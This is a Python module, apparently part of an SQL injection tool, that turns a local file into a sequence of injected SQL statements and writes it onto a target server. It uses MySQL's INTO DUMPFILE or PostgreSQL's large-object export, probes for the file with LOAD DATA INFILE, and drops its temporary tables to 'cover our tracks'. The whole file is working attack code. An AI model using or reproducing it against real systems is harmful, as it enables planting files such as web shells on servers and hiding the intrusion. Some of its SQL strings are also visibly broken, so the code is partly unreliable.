import logging
import binascii
import base64
import random
import string
import re

from .attack import Attack, AttackException

log = logging.getLogger(__name__)

class FileWriteAttackException(AttackException):
    pass

class FileWriteAttack(Attack):
    '''Abstract the SQL statements per database implementation.'''

    attack_name = 'filewrite'

    def __init__(self, conf_entry):
        super(FileWriteAttack, self).__init__(conf_entry)

        # Used to check for file existance. This code will be in the returned
        # page at some point if we're testing for file existence. 
        # (Set before calling _filewrite_sequence() as that has the side effect of setting
        # it to some value.
        self._fileexist_code = None

        # prebuild the sql sequence. This may be better done one at a time so as to not
        # read the whole file into memory. GTL fix this.
        self.sqls = self._filewrite_sequence()


    def _confirm_config(self):
        '''Make sure the config has what we need for the file write attack.'''
        super(FileWriteAttack, self)._confirm_config()
        req = ['database', 'file_write', 'file_dest']
        for r in req:
            if not getattr(self, r, False):
                raise FileWriteAttackException('Missing {} from config for File write attack.'.format(r))

    def next_sql(self):
        for s in self.sqls:
            yield s

    def _filewrite_sequence(self):
        if self.database == 'mysql':
            return self._filewrite_seq_mysql(self.file_write, self.file_dest)
        elif self.database == 'postgres':
            return self._filewrite_seq_postgres(self.file_write, self.file_dest)

        raise DatabaseException('file write attack only supported on mysql.')

    def _write_filedata(self, pathfrom, datatype='text', enc64=True):
        '''Take the given file and create a series of SQL statements that create a table
        and write the file data to it. If enc64 is True, use base64 encoding, otherwise
        use hex encoding. datatype is the column datatype used for the table.
        Returns teh (random) table name and series of SQL statements.'''
        table = ''.join(random.choice(string.ascii_uppercase) for _ in range(16))
        statements = []
        statements.append('CREATE TABLE {} (data {})'.format(table, datatype))
        default_chunk_len = 1024

        with open(pathfrom, 'rb') as fd:
            chunk_len = default_chunk_len if not self._se.has_message_size() else self._se.message_size()
            log.debug('Reading {} bytes from {}.'.format(chunk_len, pathfrom))
            chunk = fd.read(chunk_len)
            if enc64:
                data = base64.encodebytes(chunk).decode()     # the decode() decodes the python byte string.
            else:
                data = binascii.b2a_hex(chunk).decode()

            statements.append('INSERT INTO {} (data) VALUES(\'{}\')'.format(table, data))
            while chunk:
                chunk_len = default_chunk_len if not self._se.has_message_size() else self._se.message_size()
                log.debug('Reading {} bytes from {}.'.format(chunk_len, pathfrom))
                chunk = fd.read(chunk_len)
                if chunk:
                    if enc64:
                        data = base64.encodebytes(chunk).decode()
                    else:
                        data = binascii.b2a_hex(chunk).decode()

                    statements.append('UPDATE {} SET data = concat(data,\'{}\''.format(table, data))

        return table, statements

    def _filewrite_seq_mysql(self, pathfrom, pathto):
        # write file to a table
        file_exist_statements = self._check_file_exist(pathto)
        table, statements = self._write_filedata(pathfrom, datatype='LONGBLOB', enc64=False)
        statements = file_exist_statements + statements

        # now read it out of the database and into a file.
        # (We would use base64 here, but mysql 5.0 does not support native base64 decoding.)
        statements.append('SELECT UNHEX(data) FROM {} INTO DUMPFILE \'{}\''.format(table, pathto))

        # now cover our tracks.
        statements.append('DROP TABLE {}'.format(table))

        return statements

    def _filewrite_seq_postgres(self, pathfrom, pathto):
        # write file to a table
        table, statements = self._write_filedata(pathfrom, datatype='text', enc64=False)

        # now read it out of the database and into a file.
        loid = ''.join(random.choice(string.digits) for _ in range(6))
        statements.append('select lo_create({})'.format(loid)) 

        # we don't use set data as that is mucking with internal structure of LOs in the DB.
        # instead we use the lo_* functions directly and let postgres worry about the details.
        # It's possible that we could skip the step of writing the data to a temp table and just
        # use lo_write(), lo_open(), and lo_seek() in some combination. It's touch though as we
        # do not have direct access to the fd returned from lo_open. 
        #
        # magic number x'60000'::int is WRITE_INV|READ_INV for lo_open from postgres source. 
        statements.append('select lowrite(lo_open({}, x\'60000\'::int), '
                          'decode((select data from {}), \'hex\'))'.format(loid, table))

        # this breaks for data > 2048 bytes.
        # statements.append('update pg_largeobject set data = (decode((select data from {}),'
        statements.append('select lo_export({}, \'{}\')'.format(loid, pathto))

        # now cover our tracks.
        statements.append('select lo_unlink({})'.format(loid))
        statements.append('drop table {}'.format(table))

        return statements

    def handle_response(self, response, url):
        '''Handle responses to our SQL statements.'''
        log.info('Got response.')
        if self._fileexist_code:
            # Check for a file exist code in the returned page, if there check the value.
            # a non-zero return means the file does exist else it does not or we do not
            # have read/write access to it.
            m = re.search('{}=(\d+)'.format(self._fileexist_code), response, flags=re.DOTALL)
            if m:
                char_count = m.groups(1)[0]
                log.debug('Found response --> {}'.format(char_count))
                if 0 < int(char_count):
                    log.warning('File we are trying to overwrite already exists.')
                    return 1, ('File already exists - the attack will fail as MYSQL does not '
                                'overwrite an existing file. Remove the file or use a different '
                                'path.')

        return 0, ''

    def _check_file_exist(self, remotepath):
        '''Add a few SQL statements taht will check for the existance of a file. The statements
        will be injected and the response must be checked for in handle_response().'''
        table = ''.join(random.choice(string.ascii_uppercase) for _ in range(16))
        self._fileexist_code = ''.join(random.choice(string.ascii_uppercase) for _ in range(6))
        statements = []
        statements.append('CREATE TABLE {} (data blob)'.format(table))
        statements.append('load data infile "{}" into table {}'.format(remotepath, table))
        # Now we check the number of lines written to the table. If 0, the file does not
        # exist or we do not have permission to read/wrote it anyway...
        statements.append('SELECT CONCAT(\'{}=\', count(*)) from {}'.format(
            self._fileexist_code, table))
        statements.append('DROP TABLE {}'.format(table))
        return statements
